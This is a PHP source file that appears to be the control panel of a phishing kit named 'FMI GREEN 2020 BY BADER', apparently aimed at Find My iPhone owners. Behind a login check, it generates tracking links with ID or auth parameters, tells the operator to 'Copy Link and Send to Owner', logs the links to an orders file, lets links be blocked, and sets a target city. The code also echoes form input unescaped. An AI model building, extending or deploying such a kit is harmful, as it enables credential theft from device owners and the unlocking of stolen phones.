<?php
session_start(); /* Starts the session */
if (!isset($_SESSION['UserData']['Username'])) {
    header("location:../../admin/index.php");
    exit;
}
echo "
<!DOCTYPE html>
<html >
<head>  <title>FMI GREEN</title>
  
      <link rel=\"stylesheet\" href=\"style1.css\">
<meta name=\"viewport\" content=\"initial-scale=1, maximum-scale=1\">
  
</head>

<body>
<br><br>
  <h1>FMI GREEN 2020 BY BADER</h1><br><br>


";
echo "<center>
";
echo "<div class=\"btn-container\">

<h2 style=\"color:#fff\" > Random / ID to create Link</h2>
<br><br>
";
echo " <form action=\"\" method=\"post\">
			
<input  type=\"text\" name=\"city\"  placeholder=\"City or Country\" style=\"font-size:14pt;height:30px;width:80%;\" />

			
<br><br>
<input type=\"submit\" name=\"sumbitcity\" class=\"btn\" value=\"City\" />
		
<br>

<input  type=\"text\" name=\"lin\" style=\"font-size:14pt;height:30px;width:80%;\" />

			
<br><br>

<input type=\"submit\" name=\"submitld\" class=\"btn\" value=\"Random link\" />
		
<br>
<input type=\"submit\" name=\"submitblock\" class=\"btn\" value=\"Block\" />
		</form>
		";
if (isset($_POST["submitID"])) {
    $lin = empty($_POST["lin"]) ? exit : $_POST["lin"];
    echo "<textarea onclick=\"this.select();\" style=\"font-size:14pt;height:80px;width:300px;\" >https://" . $_SERVER["HTTP_HOST"] . "/FMI/?ID=" . $lin . "</textarea>";
    file_put_contents("../../ajax/orders.txt", $lin . "
", FILE_APPEND);
    echo "<br><br><h3><font color=\"#fff\">" . $threadinfo . " Copy Link and Send to Owner</font></h3>";
}
if (isset($_POST["submitld"])) {
    $lin = empty($_POST["lin"]) ? exit : $_POST["lin"];
    echo "<textarea onclick=\"this.select();\" style=\"font-size:14pt;height:80px;width:300px;\" >https://" . $_SERVER["HTTP_HOST"] . "/FMI/?auth=" . $lin . "</textarea>";
    file_put_contents("../../ajax/orders.txt", $lin . "
", FILE_APPEND);
    echo "<br><br><h3><font color=\"#fff\">" . $threadinfo . " Copy Link and Send to Owner</font></h3>";
}
if (isset($_POST["submitblock"])) {
    $a = $_POST["lin"];
    $filename = "../../ajax/orders.txt";
    $string_to_replace = $a;
    $replace_with = "";
    replace_string_in_file($filename, $string_to_replace, $replace_with);
    echo "<br><h3><font color=\"#fff\">" . $threadinfo . " Link Blocked Successfully</font></h3>";
}
if (isset($_POST["sumbitcity"])) {
    file_put_contents("../city.txt", '');
    $city = empty($_POST["city"]) ? exit : $_POST["city"];
    echo "<textarea onclick=\"this.select();\" style=\"font-size:14pt;height:80px;width:300px;\" >City=" . $city . "</textarea>";
    file_put_contents("../city.txt", $city);
    echo "<br><br><h3><font color=\"#fff\">" . $threadinfo . " ok</font></h3>";
}
function replace_string_in_file($filename, $string_to_replace, $replace_with) {
    $content = file_get_contents($filename);
    $content_chunks = explode($string_to_replace, $content);
    $content = implode($replace_with, $content_chunks);
    file_put_contents($filename, $content);
}
echo "		
</div>
";
echo "</center>
";
echo "<script src='http://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script>

  
</body>
</html>
";
?>